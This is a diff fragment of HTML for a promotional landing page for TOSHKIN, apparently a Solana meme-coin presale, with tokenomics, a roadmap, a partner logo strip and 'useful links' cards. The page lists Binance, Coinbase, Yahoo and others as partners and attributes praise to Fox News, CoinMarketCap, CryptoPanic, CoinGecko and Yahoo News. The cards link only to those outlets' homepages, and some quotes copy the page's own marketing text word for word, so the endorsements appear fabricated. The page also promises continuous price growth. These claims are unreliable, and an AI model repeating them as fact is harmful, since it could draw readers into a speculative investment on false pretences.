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">
+                                        <p></p>
+                                    </canvas></div>
+                                <ul class="home-toshkinomics__chart-info"><!--[-->
+                                    <li class="home-toshkinomics__chart-info-item"><span
+                                            style="background-color: #41B883;"
+                                            class="home-toshkinomics__chart-info-color"></span> PreSale SOL</li>
+                                    <li class="home-toshkinomics__chart-info-item"><span
+                                            style="background-color: #E46651;"
+                                            class="home-toshkinomics__chart-info-color"></span> Cross Chain</li>
+                                    <li class="home-toshkinomics__chart-info-item"><span
+                                            style="background-color: #00D8FF;"
+                                            class="home-toshkinomics__chart-info-color"></span> Treasury</li>
+                                    <li class="home-toshkinomics__chart-info-item"><span
+                                            style="background-color: #8e2f41;"
+                                            class="home-toshkinomics__chart-info-color"></span> AirDrop</li>
+                                    <li class="home-toshkinomics__chart-info-item"><span
+                                            style="background-color: #cfd123;"
+                                            class="home-toshkinomics__chart-info-color"></span> Staking Rewards</li>
+                                    <li class="home-toshkinomics__chart-info-item"><span
+                                            style="background-color: #DD1B48;"
+                                            class="home-toshkinomics__chart-info-color"></span> Gaming Rewards</li>
+                                    <li class="home-toshkinomics__chart-info-item"><span
+                                            style="background-color: #2525fa;"
+                                            class="home-toshkinomics__chart-info-color"></span> CEX / DEX Liquidity</li>
+                                    <li class="home-toshkinomics__chart-info-item"><span
+                                            style="background-color: #DD1BFF;"
+                                            class="home-toshkinomics__chart-info-color"></span> DAO Foundation</li>
+                                    <!--]-->
+                                </ul>
+                            </div>
+                            <div class="home-toshkinomics__block home-toshkinomics__description">
+                                <div>
+                                    <p>Strategic allocation of TOSHKIN tokens provides the right balance between early
+                                        investors, deep liquidity for exchanges, and explosive marketing.</p>
+                                    <p>The TOSHKIN team's well-designed tokenomics ensures ongoing interest from
+                                        investors, maintaining a healthy supply and demand balance, building trust, and
+                                        supporting continuous price growth.</p>
+                                    <p>It fosters the development of new features such as unique NFT offerings and the
+                                        integration of new AI capabilities.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <section class="home-our-partners" id="our-partners" data-section="our-partners">
+                        <div class="home-our-partners__wrapper">
+                            <h2 class="home-our-partners__title"><span>Our</span> Partners</h2>
+                        </div>
+                        <div class="vue3-marquee horizontal home-our-partners__list"
+                            style="--duration: 20s; --delay: 0s; --direction: normal; --pauseOnHover: running; --pauseOnClick: running; --pauseAnimation: running; --loops: infinite; --gradient-color: rgba(255, 255, 255, 1), rgba(255, 255, 255, 0); --gradient-length: 200px; --min-width: 100%; --min-height: auto; --orientation: scrollX;">
+                            <div class="transparent-overlay" aria-hidden="true"></div><!---->
+                            <div class="marquee">
+                                <div class="home-our-partners__item"><!----><img src="latoken.png" alt="Latoken"></div>
+                                <div class="home-our-partners__item"><!----><img src="yahoo.png" alt="Yahoo"></div>
+                                <div class="home-our-partners__item"><!----><img src="avedex.png" alt="Avedex"></div>
+                                <div class="home-our-partners__item"><!----><img src="binance.png" alt="Binance"></div>
+                                <div class="home-our-partners__item"><!----><img src="bitmart.png" alt="Bitmart"></div>
+                                <div class="home-our-partners__item"><!----><img src="cg.png" alt="Cg"></div>
+                                <div class="home-our-partners__item"><!----><img src="cmc.png" alt="Cmc"></div>
+                                <div class="home-our-partners__item"><!----><img src="coinbase.png" alt="Coinbase">
+                                </div>
+                                <div class="home-our-partners__item"><!----><img src="coinex.png" alt="Coinex"></div>
+                                <div class="home-our-partners__item"><!----><img src="cointelegraph.png"
+                                        alt="Cointelegraph"></div>
+                                <div class="home-our-partners__item"><!----><img src="kucoin.png" alt="Kucoin"></div>
+                                <div class="home-our-partners__item"><!----><img src="okex.png" alt="Okex"></div>
+                            </div>
+                            <div aria-hidden="true" class="marquee">
+                                <div class="home-our-partners__item"><!----><img src="latoken.png" alt="Latoken"></div>
+                                <div class="home-our-partners__item"><!----><img src="yahoo.png" alt="Yahoo"></div>
+                                <div class="home-our-partners__item"><!----><img src="avedex.png" alt="Avedex"></div>
+                                <div class="home-our-partners__item"><!----><img src="binance.png" alt="Binance"></div>
+                                <div class="home-our-partners__item"><!----><img src="bitmart.png" alt="Bitmart"></div>
+                                <div class="home-our-partners__item"><!----><img src="cg.png" alt="Cg"></div>
+                                <div class="home-our-partners__item"><!----><img src="cmc.png" alt="Cmc"></div>
+                                <div class="home-our-partners__item"><!----><img src="coinbase.png" alt="Coinbase">
+                                </div>
+                                <div class="home-our-partners__item"><!----><img src="coinex.png" alt="Coinex"></div>
+                                <div class="home-our-partners__item"><!----><img src="cointelegraph.png"
+                                        alt="Cointelegraph"></div>
+                                <div class="home-our-partners__item"><!----><img src="kucoin.png" alt="Kucoin"></div>
+                                <div class="home-our-partners__item"><!----><img src="okex.png" alt="Okex"></div>
+                            </div>
+                        </div>
+                    </section>
+                    <section class="home-all-markets" id="all-markets" data-section="all-markets">
+                        <h2 class="home-all-markets__title"><span>All</span> Markets</h2>
+                        <div class="home-all-markets__description">
+                            <div>
+                                <p>We are thrilled to announce that we are taking a comprehensive approach to promote
+                                    the TOSHKIN token and strengthen its presence in the cryptocurrency and blockchain
+                                    markets.</p>
+                                <p>As part of this commitment, we are developing a multifaceted marketing strategy
+                                    across X, Telegram, TikTok, Instagram, and YouTube that generates significant hype
+                                    and drives high interest in the project.</p>
+                                <p>Our approach to each of these platforms, including Yahoo Finance, CoinTelegraph,
+                                    YouTubers, calls, and AMAs, is designed to maximize visibility, engagement, and
+                                    community interaction. We aim to deliver tailored content and initiatives that
+                                    resonate with each platform's audience while maintaining a consistent message across
+                                    all channels.</p>
+                                <p>By leveraging the unique strengths of each platform, we can effectively communicate
+                                    the fun value proposition of TOSHKIN and foster a vibrant and supportive community
+                                    around the token.</p>
+                            </div>
+                        </div>
+                        <div class="home-all-markets__image"><img src="img.gif" alt=""></div>
+                    </section>
+                    <section class="home-roadmap" id="roadmap" data-section="roadmap">
+                        <h2 class="home-roadmap__title"><span>Road</span>map</h2>
+                        <div class="home-roadmap__list"><span
+                                class="home-roadmap__circle home-roadmap__list-circle"></span><!--[-->
+                            <div class="home-roadmap__stage" style="grid-area: 1 / 2 / 2 / 3;width:100%;"><!---->
+                                <h4>PHASE 1</h4><!--[-->
+                                <div class="home-roadmap__stage-item">
+                                    <p>Smart Contract on Solana <svg xmlns="http://www.w3.org/2000/svg"
+                                            viewBox="0 0 24 17" width="24px" fill="#418121">
+                                            <path fill-rule="evenodd"
+                                                d="M23.121 1.321c1.172 1.095 1.172 2.87 0 3.965l-10.5 9.812c-2 1.87-5.242 1.87-7.242 0l-4.5-4.205c-1.172-1.095-1.172-2.87 0-3.965s3.07-1.095 4.242 0L9 10.553l9.879-9.232c1.171-1.095 3.07-1.095 4.242 0"
+                                                clip-rule="evenodd"></path>
+                                        </svg></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Art Design Team <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 17"
+                                            width="24px" fill="#418121">
+                                            <path fill-rule="evenodd"
+                                                d="M23.121 1.321c1.172 1.095 1.172 2.87 0 3.965l-10.5 9.812c-2 1.87-5.242 1.87-7.242 0l-4.5-4.205c-1.172-1.095-1.172-2.87 0-3.965s3.07-1.095 4.242 0L9 10.553l9.879-9.232c1.171-1.095 3.07-1.095 4.242 0"
+                                                clip-rule="evenodd"></path>
+                                        </svg></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Website Launch <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 17"
+                                            width="24px" fill="#418121">
+                                            <path fill-rule="evenodd"
+                                                d="M23.121 1.321c1.172 1.095 1.172 2.87 0 3.965l-10.5 9.812c-2 1.87-5.242 1.87-7.242 0l-4.5-4.205c-1.172-1.095-1.172-2.87 0-3.965s3.07-1.095 4.242 0L9 10.553l9.879-9.232c1.171-1.095 3.07-1.095 4.242 0"
+                                                clip-rule="evenodd"></path>
+                                        </svg></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Social Media Launch, X and Telegram <svg xmlns="http://www.w3.org/2000/svg"
+                                            viewBox="0 0 24 17" width="24px" fill="#418121">
+                                            <path fill-rule="evenodd"
+                                                d="M23.121 1.321c1.172 1.095 1.172 2.87 0 3.965l-10.5 9.812c-2 1.87-5.242 1.87-7.242 0l-4.5-4.205c-1.172-1.095-1.172-2.87 0-3.965s3.07-1.095 4.242 0L9 10.553l9.879-9.232c1.171-1.095 3.07-1.095 4.242 0"
+                                                clip-rule="evenodd"></path>
+                                        </svg></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Marketing on Yahoo Finance and Google <svg xmlns="http://www.w3.org/2000/svg"
+                                            viewBox="0 0 24 17" width="24px" fill="#418121">
+                                            <path fill-rule="evenodd"
+                                                d="M23.121 1.321c1.172 1.095 1.172 2.87 0 3.965l-10.5 9.812c-2 1.87-5.242 1.87-7.242 0l-4.5-4.205c-1.172-1.095-1.172-2.87 0-3.965s3.07-1.095 4.242 0L9 10.553l9.879-9.232c1.171-1.095 3.07-1.095 4.242 0"
+                                                clip-rule="evenodd"></path>
+                                        </svg></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Originals NFT Collection Creation <svg xmlns="http://www.w3.org/2000/svg"
+                                            viewBox="0 0 24 17" width="24px" fill="#418121">
+                                            <path fill-rule="evenodd"
+                                                d="M23.121 1.321c1.172 1.095 1.172 2.87 0 3.965l-10.5 9.812c-2 1.87-5.242 1.87-7.242 0l-4.5-4.205c-1.172-1.095-1.172-2.87 0-3.965s3.07-1.095 4.242 0L9 10.553l9.879-9.232c1.171-1.095 3.07-1.095 4.242 0"
+                                                clip-rule="evenodd"></path>
+                                        </svg></p>
+                                </div><!--]-->
+                            </div>
+                            <div class="home-roadmap__stage" style="grid-area: 2 / 1 / 3 / 2;width:100%;"><span
+                                    class="home-roadmap__circle home-roadmap__stage-circle home-roadmap__stage-circle_odd"></span>
+                                <h4>PHASE 2</h4><!--[-->
+                                <div class="home-roadmap__stage-item">
+                                    <p>Seed Investment Round <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 17"
+                                            width="24px" fill="#418121">
+                                            <path fill-rule="evenodd"
+                                                d="M23.121 1.321c1.172 1.095 1.172 2.87 0 3.965l-10.5 9.812c-2 1.87-5.242 1.87-7.242 0l-4.5-4.205c-1.172-1.095-1.172-2.87 0-3.965s3.07-1.095 4.242 0L9 10.553l9.879-9.232c1.171-1.095 3.07-1.095 4.242 0"
+                                                clip-rule="evenodd"></path>
+                                        </svg></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Game Bot Development Team <svg xmlns="http://www.w3.org/2000/svg"
+                                            viewBox="0 0 24 17" width="24px" fill="#418121">
+                                            <path fill-rule="evenodd"
+                                                d="M23.121 1.321c1.172 1.095 1.172 2.87 0 3.965l-10.5 9.812c-2 1.87-5.242 1.87-7.242 0l-4.5-4.205c-1.172-1.095-1.172-2.87 0-3.965s3.07-1.095 4.242 0L9 10.553l9.879-9.232c1.171-1.095 3.07-1.095 4.242 0"
+                                                clip-rule="evenodd"></path>
+                                        </svg></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>KYC and Contract Audit <svg xmlns="http://www.w3.org/2000/svg"
+                                            viewBox="0 0 24 17" width="24px" fill="#418121">
+                                            <path fill-rule="evenodd"
+                                                d="M23.121 1.321c1.172 1.095 1.172 2.87 0 3.965l-10.5 9.812c-2 1.87-5.242 1.87-7.242 0l-4.5-4.205c-1.172-1.095-1.172-2.87 0-3.965s3.07-1.095 4.242 0L9 10.553l9.879-9.232c1.171-1.095 3.07-1.095 4.242 0"
+                                                clip-rule="evenodd"></path>
+                                        </svg></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>PinkSale PreSale Starts 21 June 2024 <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Listing on Radium, Jupiter DEX <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Marketing Stage 2 Push <!----></p>
+                                </div><!--]-->
+                            </div>
+                            <div class="home-roadmap__stage" style="grid-area: 3 / 2 / 4 / 3;width:100%;"><span
+                                    class="home-roadmap__circle home-roadmap__stage-circle home-roadmap__stage-circle_even"></span>
+                                <h4>PHASE 3</h4><!--[-->
+                                <div class="home-roadmap__stage-item">
+                                    <p>Listing CoinMarketCap <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Lisitng CoinGecko <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Launching on BASE <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Stage 3 Marketing Push <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Prize Money pool AirDrop <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>NFT Second Season - Doodle and Classics <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Generative AI interaction model <!----></p>
+                                </div><!--]-->
+                            </div>
+                            <div class="home-roadmap__stage"
+                                style="grid-area: 4 / 1 / 5 / 2;margin-left: calc(50% + 48px);width:100%;"><!---->
+                                <h4>PHASE 4</h4><!--[-->
+                                <div class="home-roadmap__stage-item">
+                                    <p>Staking Rewards platfrom integration <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Gaming Telegram dAPP deployment <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Failaunch on ETH <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Cross Chain Bridging <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Fairaunch on Binance Smart Chain <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Final Stage Marketing Push <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>Listing on Binance USDT/ETH/BTC/USDC pairs <!----></p>
+                                </div>
+                                <div class="home-roadmap__stage-item">
+                                    <p>DAO Foundation and Voting Mechanism <!----></p>
+                                </div><!--]-->
+                            </div><!--]-->
+                        </div>
+                    </section>
+                    <div class="home-useful-links" id="useful-links" data-section="useful-links">
+                        <h2 class="home-useful-links__title"><span>Useful</span> links</h2>
+                        <div>
+                            <div class="flicking-viewport home-useful-links__slider"
+                                style="user-select: none; -webkit-user-drag: none; touch-action: pan-y;">
+                                <div class="flicking-camera" style="transform: translate(-454.672px);"><!--[-->
+                                    <div class="home-useful-links__item"><img src="news-2.png" alt="">
+                                        <div class="home-useful-links__item-content">
+                                            <h4>Fox News</h4>
+                                            <div class="home-useful-links__item-bottom">
+                                                <p>TOSHKIN is the meme coin with an attitude set to be the next hype on
+                                                    the SOLANA network.</p><a href="https://www.foxnews.com/"
+                                                    class="home-useful-links__item-link" target="_blank"
+                                                    rel="nofollow">More</a>
+                                            </div>
+                                        </div>
+                                    </div><!--]--><!--[-->
+                                    <div class="home-useful-links__item"><img src="news-3.png" alt="">
+                                        <div class="home-useful-links__item-content">
+                                            <h4>CoinMarketCap</h4>
+                                            <div class="home-useful-links__item-bottom">
+                                                <p>TOSHKIN's unique NFTs offer additional whitelist airdrops, special
+                                                    NFT releases, and exclusive presale opportunities!</p><a
+                                                    href="https://coinmarketcap.com/"
+                                                    class="home-useful-links__item-link" target="_blank"
+                                                    rel="nofollow">More</a>
+                                            </div>
+                                        </div>
+                                    </div><!--]--><!--[-->
+                                    <div class="home-useful-links__item"><img src="news-4.png" alt="">
+                                        <div class="home-useful-links__item-content">
+                                            <h4>CryptoPanic</h4>
+                                            <div class="home-useful-links__item-bottom">
+                                                <p>The TOSHKIN team's well-designed tokenomics ensures ongoing interest
+                                                    from investors, maintaining a healthy supply and demand balance,
+                                                    building trust, and supporting continuous price growth.</p><a
+                                                    href="https://cryptopanic.com/" class="home-useful-links__item-link"
+                                                    target="_blank" rel="nofollow">More</a>
+                                            </div>
+                                        </div>
+                                    </div><!--]--><!--[-->
+                                    <div class="home-useful-links__item"><img src="news-5.png" alt="">
+                                        <div class="home-useful-links__item-content">
+                                            <h4>CoinGecko</h4>
+                                            <div class="home-useful-links__item-bottom">
+                                                <p>TOSHKIN thrilled to announce that it is taking a comprehensive
+                                                    approach to promote the TOSHKIN token and strengthen its presence in
+                                                    the cryptocurrency and blockchain markets.</p><a
+                                                    href="https://www.coingecko.com/"
+                                                    class="home-useful-links__item-link" target="_blank"
+                                                    rel="nofollow">More</a>
+                                            </div>
+                                        </div>
+                                    </div><!--]--><!--[-->
+                                    <div class="home-useful-links__item"><img src="news-1.png" alt="">
+                                        <div class="home-useful-links__item-content">
+                                            <h4>Yahoo News</h4>
+                                            <div class="home-useful-links__item-bottom">
+                                                <p>TOSHKIN has unique characteristics that make it shine among other
+                                                    current coins.</p><a href="https://news.yahoo.com/"
+                                                    class="home-useful-links__item-link" target="_blank"
+                                                    rel="nofollow">More</a>
+                                            </div>
+                                        </div>
+                                    </div><!--]-->
+                                </div>
+                            </div>
+                            <div class="home-useful-links__slider-bottom">
+                                <div class="flicking-pagination flicking-pagination-scroll" style="width: 1225px;">
+                                    <div class="flicking-pagination-slider" style="transform: translate(-245px);"><span
+                                            class="flicking-pagination-bullet flicking-pagination-bullet-prev3"></span>
+                                        <span
+                                            class="flicking-pagination-bullet flicking-pagination-bullet-prev2"></span>
+                                        <span class="flicking-pagination-bullet flicking-pagination-bullet-prev"></span>
+                                        <span
+                                            class="flicking-pagination-bullet flicking-pagination-bullet-active"></span>
+                                        <span class="flicking-pagination-bullet flicking-pagination-bullet-next"></span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div><!--]-->
+                <div class="-layout__socials">
+                    <div class="-socials"><!--[--><a href="https://x.com/toshkincoin" title="X"
+                            class="-socials__icons -socials__x" target="_blank" rel="nofollow"><svg
+                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 76 56">
+                                <path
+                                    d="m15.32 6.907 17.599 23.268-17.711 18.918h3.986L34.7 32.53l12.527 16.563h13.565l-18.59-24.577 16.485-17.61h-3.986l-14.28 15.255L28.883 6.907zm5.86 2.903h6.232L54.93 46.19h-6.231z">
+                                </path>
+                            </svg></a><a href="https://t.me/toshkincoin" title="Telegram"
+                            class="-socials__icons -socials__telegram" target="_blank" rel="nofollow"><svg
+                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 60">
+                                <path
+                                    d="m24.45 46.625.7-10.575 19.2-17.3c.85-.775-.175-1.15-1.3-.475L19.35 33.25 9.1 30c-2.2-.625-2.225-2.15.5-3.25l39.925-15.4c1.825-.825 3.575.45 2.875 3.25l-6.8 32.025c-.475 2.275-1.85 2.825-3.75 1.775L31.5 40.75l-4.975 4.825c-.575.575-1.05 1.05-2.075 1.05">
+                                </path>
+                            </svg></a><a href="https://x.com/toshkincoin" title="Tiktok"
+                            class="-socials__icons -socials__tiktok" target="_blank" rel="nofollow"><svg
+                                xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                                <path
+                                    d="M18.393 48.05c-4.189-.756-8.15-3.667-9.91-7.281-1.221-2.51-1.69-5.163-1.389-7.851.56-4.982 3.138-9.061 7.147-11.306 2.113-1.183 5.14-1.771 7.395-1.436l1.303.193v7.967l-1.232-.052c-2.972-.123-5.185 1.15-6.329 3.634-.547 1.188-.685 3.3-.3 4.587.474 1.588 1.877 3.02 3.57 3.65.578.215 1.202.297 2.272.293 1.332-.001 1.576-.048 2.513-.491 1.356-.641 2.345-1.572 2.927-2.753.377-.765.498-1.274.616-2.582.08-.896.149-8.216.152-16.268l.003-14.64h2.54c1.397 0 3.074.044 3.728.1l1.188.1v.589c0 1.416.829 4.133 1.677 5.501.213.342.953 1.18 1.647 1.864 1.34 1.32 2.47 1.988 4.21 2.486.512.148 1.053.33 1.201.405.149.074.428.14.622.14.193.002.509.045.701.097l.35.093v7.39l-.66-.07c-3.57-.386-6.424-1.338-8.7-2.905-1.132-.779-1.23-.825-1.123-.528.039.108.011 4.178-.061 9.048-.125 8.442-.147 8.911-.475 10.093-1.259 4.54-4.085 7.91-7.806 9.31-2.276.857-5.187 1.092-7.777.624">
+                                </path>
+                            </svg></a><!--]--></div>
+                </div>
+            </div>
+            <div class="-footer --footer">
+                <div class="-footer__wrapper">
+                    <div class="-footer__top">
+                        <div class="-footer__logo"><svg xmlns="http://www.w3.org/2000/svg"
+                                xmlns:xlink="http://www.w3.org/1999/xlink" fill="none" viewBox="0 0 227 50"
+                                width="227px">
+                                <path fill="#fff"
+                                    d="M202.242 38V12.44h5.796l10.188 15.768.072-.036V12.44h5.94V38h-5.976l-10.008-15.336h-.072V38zm-10.93 0V12.44h6.156V38zm-23.98 0V12.44h6.012v9.792h.072l7.416-9.792h7.596l-9.216 11.088L188.752 38h-7.38l-6.12-9.72-1.908 2.34V38zm-25.735 0V12.44h6.084v10.584h9V12.44h6.048V38h-6.048v-9.648h-9V38zm-12.755.324c-3.276 0-6.66-1.26-9.396-4.068l3.528-4.284c1.944 2.124 4.284 3.024 6.048 3.024 2.016 0 2.88-1.008 2.88-2.16 0-1.404-.9-2.016-3.78-2.988-3.888-1.332-7.776-3.168-7.776-8.208 0-4.248 3.636-7.452 8.388-7.524 3.348-.072 6.408 1.224 8.856 3.312l-3.384 4.392c-2.196-1.728-3.78-2.412-5.22-2.412-1.476 0-2.376.756-2.376 1.98-.036 1.224.9 1.872 3.672 2.952 4.5 1.728 7.956 2.88 7.956 7.812 0 6.012-5.148 8.172-9.396 8.172m-24.61 0c-7.776 0-13.176-5.4-13.176-13.104s5.4-13.14 13.176-13.14c7.632 0 13.14 5.292 13.14 13.14 0 7.812-5.508 13.104-13.14 13.104m0-5.58c3.96 0 6.84-3.276 6.84-7.524s-2.88-7.524-6.84-7.524c-4.032 0-6.876 3.348-6.876 7.524s2.844 7.524 6.876 7.524M77.488 38V17.804h-6.66V12.44h19.476v5.364h-6.696V38z">
+                                </path>
+                                <path fill="url(#a)" d="M0 0h50v50H0z"></path>
+                                <defs>
+                                    <pattern id="a" width="1" height="1" patternContentUnits="objectBoundingBox">
+                                        <use xlink:href="#b" transform="scale(.00444)"></use>
